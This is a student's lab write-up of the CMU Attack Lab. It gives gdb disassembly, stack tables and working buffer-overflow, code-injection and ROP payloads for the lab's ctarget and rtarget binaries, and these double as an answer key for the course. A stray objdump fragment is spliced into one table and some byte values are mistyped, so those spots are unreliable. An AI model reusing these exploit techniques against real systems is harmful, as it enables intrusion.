## Phase 1
```
(gdb) disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   
End of assembler dump.
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.

(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```


### stack layout (Origin)

```
(gdb) x /8gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000002      0x0000000000401f24
```

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                    |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | what's that?            |
| 0x5561dcb8 | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | what's that?            |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()? |
| 0x5561dca8 | -    | -    | -    | -    | -    | -    | -    | -    | test() stack            |
| 0x5561dca0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x19 | 0x76 | 0x401976 return test()  |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack          |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                         |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                         |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    |                         |
| 0x5561dc78 | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp            |

> 其中 **-** 表示未初始化的内存

### Solution

```
cat result1 | ./hex2raw
0123456789012345678901234567890123456789�@
cat result1 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 
```

40 pading bytes, and the return address 0x4017c0 (getbuf). the entire return address should be typed, as the Gets() place a '\0' at the end of input.

## Phase 2

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
End of assembler dump.
(gdb) 
```

### stack layout


```bash
# cat cookie.txt 
0x59b997fa
# cat 2.s
mov $0x59b997fa,%rdi
ret
# gcc -c 2.s
# objdump -d 2.o

2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   c3                      retq 
```


| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                      |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------- |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?   |
| 0x5561dca8 | '\0' | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x17 | 0xec | ret touch2()              |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc | 0x78 | ret 0x5561dc78 (stack!)   |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack            |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
| 0x5561dc78 | 0xc3 | 0x59 | 0xb9 | 0x97 | 0xfa | 0xc7 | 0xc7 | 0x48 | mov $0x59b997fa,%rdi; ret |

### Solution

```
cat result2 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00 EC 17 40 
```

## Phase 3

```
(gdb) disassemble touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	callq  0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	callq  0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	callq  0x400e40 <exit@plt>
End of assembler dump.
(gdb) disas hexmatch
Dump of assembler code for function hexmatch:
   0x000000000040184c <+0>:	push   %r12
   0x000000000040184e <+2>:	push   %rbp
   0x000000000040184f <+3>:	push   %rbx
   0x0000000000401850 <+4>:	add    $0xffffffffffffff80,%rsp         # -128, rsp would now at 0x5561dc08
   0x0000000000401854 <+8>:	mov    %edi,%r12d
   0x0000000000401857 <+11>:	mov    %rsi,%rbp
   0x000000000040185a <+14>:	mov    %fs:0x28,%rax
   0x0000000000401863 <+23>:	mov    %rax,0x78(%rsp)              # overwritten 0x5561dc80, so the string can't be there
   0x0000000000401868 <+28>:	xor    %eax,%eax
   0x000000000040186a <+30>:	callq  0x400db0 <random@plt>
   0x000000000040186f <+35>:	mov    %rax,%rcx
   0x0000000000401872 <+38>:	movabs $0xa3d70a3d70a3d70b,%rdx
   0x000000000040187c <+48>:	imul   %rdx
   0x000000000040187f <+51>:	add    %rcx,%rdx
   0x0000000000401882 <+54>:	sar    $0x6,%rdx
   0x0000000000401886 <+58>:	mov    %rcx,%rax
   0x0000000000401889 <+61>:	sar    $0x3f,%rax
   0x000000000040188d <+65>:	sub    %rax,%rdx
   0x0000000000401890 <+68>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000401894 <+72>:	lea    (%rax,%rax,4),%rax
   0x0000000000401898 <+76>:	shl    $0x2,%rax
   0x000000000040189c <+80>:	sub    %rax,%rcx
   0x000000000040189f <+83>:	lea    (%rsp,%rcx,1),%rbx
   0x00000000004018a3 <+87>:	mov    %r12d,%r8d
   0x00000000004018a6 <+90>:	mov    $0x4030e2,%ecx
   0x00000000004018ab <+95>:	mov    $0xffffffffffffffff,%rdx
   0x00000000004018b2 <+102>:	mov    $0x1,%esi
   0x00000000004018b7 <+107>:	mov    %rbx,%rdi
   0x00000000004018ba <+110>:	mov    $0x0,%eax
   0x00000000004018bf <+115>:	callq  0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:	mov    $0x9,%edx
   0x00000000004018c9 <+125>:	mov    %rbx,%rsi
   0x00000000004018cc <+128>:	mov    %rbp,%rdi
   0x00000000004018cf <+131>:	callq  0x400ca0 <strncmp@plt>
   0x00000000004018d4 <+136>:	test   %eax,%eax
   0x00000000004018d6 <+138>:	sete   %al
   0x00000000004018d9 <+141>:	movzbl %al,%eax
   0x00000000004018dc <+144>:	mov    0x78(%rsp),%rsi
   0x00000000004018e1 <+149>:	xor    %fs:0x28,%rsi
   0x00000000004018ea <+158>:	je     0x4018f1 <hexmatch+165>
   0x00000000004018ec <+160>:	callq  0x400ce0 <__stack_chk_fail@plt>
   0x00000000004018f1 <+165>:	sub    $0xffffffffffffff80,%rsp
   0x00000000004018f5 <+169>:	pop    %rbx
   0x00000000004018f6 <+170>:	pop    %rbp
   0x00000000004018f7 <+171>:	pop    %r12
   0x00000000004018f9 <+173>:	retq   
End of assembler dump.
(gdb) dias strncmp
Undefined command: "dias".  Try "help".
(gdb) disas strncmp
Dump of assembler code for function strncmp@plt:
   0x0000000000400ca0 <+0>:	jmpq   *0x203372(%rip)        # 0x604018 <strncmp@got.plt>
   0x0000000000400ca6 <+6>:	pushq  $0x3
   0x0000000000400cab <+11>:	jmpq   0x400c60
End of assembler dump.
(gdb) disas 0x400ca0
(gdb) disas 0x604018
Dump of assembler code for function strncmp@got.plt:
   0x0000000000604018 <+0>:	cmpsb  %es:(%rdi),%ds:(%rsi)
   0x0000000000604019 <+1>:	or     $0x40,%al
   0x000000000060401b <+3>:	add    %al,(%rax)
   0x000000000060401d <+5>:	add    %al,(%rax)
   0x000000000060401f <+7>:	add    %dh,0x400c(%rsi)
End of assembler dump.
(gdb) 
```

```python
# python
Python 2.7.14 (default, Oct 12 2017, 15:50:02) [GCC] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> s="59b997fa"
>>> for x in s: print ("%x" % ord(x))
... 
35
39
62
39
39
37
66
61
>>> 
```

### stack layout

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1                                | 0    | note                    |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | -------------------------------- | ---- | ----------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4                             | '\0' | '\0' by Gets()          |
| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39                             | 0x35 | palce "59b997fa"        |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f                             | 0x24 | 0x401f24 return main()? |
| 0x5561dca8 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18                             | 0xfa | ret touch3()            |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc                             | 0x78 | ret 0x5561dc78 (stack!) |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -                                | -    | getbuf() stack          |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -                                | -    |                         |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -                                | -    |                         |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -   0000000000401ab2 <end_farm>: |
  401ab2:       b8 01 00 00 00          mov    $0x1,%eax
  401ab7:       c3                      retq   
  401ab8:       90                      nop
  401ab9:       90                      nop
  401aba:       90                      nop
  401abb:       90                      nop
  401abc:       90                      nop
  401abd:       90                      nop
  401abe:       90                      nop
  401abf:       90                      nop
 | -    | hexmatch+23 overwrite     |
| 0x5561dc78 | 0xc3 | 0x55 | 0x61 | 0xdc | 0x80 | 0xc7 | 0xc7 | 0x48 | mov $0x5561dc80,%rdi; ret |

and after execution

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                            |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | '\0' | '\0' by Gets()                  |
| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | palce "59b997fa"                |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?         |
| 0x5561dca8 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | touch3() push %rbx              |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0x61 | touch3+28 call hexmatch()       |
| 0x5561dc98 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+0 push %r12            |
| 0x5561dc90 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+2 push %rbp            |
| 0x5561dc88 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+3 push %rbx            |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    | hexmatch+23 mov $rax,0x78(%rsp) |
| 0x5561dc78 | 0xc3 | 0x55 | 0x61 | 0xdc | 0x80 | 0xc7 | 0xc7 | 0x48 | mov $0x5561dc80,%rdi; ret       |
| ...        |      |      |      |      |      |      |      |      |                                 |
| 0x5561dc08 |      |      |      |      |      |      |      |      | %rsp after hexmatch+4           |


## Phase 4

### Gadgets 1

```asm
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq

```

其中`0x4019ab`开始的`58 80 c3`可以解释为以下汇编语句

```
   0:   58                      pop    %rax
   1:   90                      nop
   2:   c3                      retq   
```

### Gadgets 2

```
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3                      retq   
```

`0x4019c6`开始的`48 89 c7 90 c`可以解释为以下汇编语句

```
   3:   48 89 c7                mov    %rax,%rdi
   6:   90                      nop
   7:   c3                      retq   
```

### Stack layout

| address | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note              |
| ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----------------- |
| 72      | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | untouched         |
| 64      | '\0' | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x17 | 0xec | ret touch2()      |
| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc6 | Gadget2 0x4019c6  |
| 48      | 0x00 | 0x00 | 0x00 | 0x00 | 0x59 | 0xb9 | 0x97 | 0xfa | cookie 0x59b997fa |
| 40      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xab | Gadget1 0x4019ab  |
| 32      | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack    |
| 24      | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 16      | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 8       | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 0       | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp      |

### solution

result4

```
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c6 19 40 00 00 00 00 00
ec 17 40 00 00 00 00
```

```
cat result4 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C6 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 
```

## Phase 5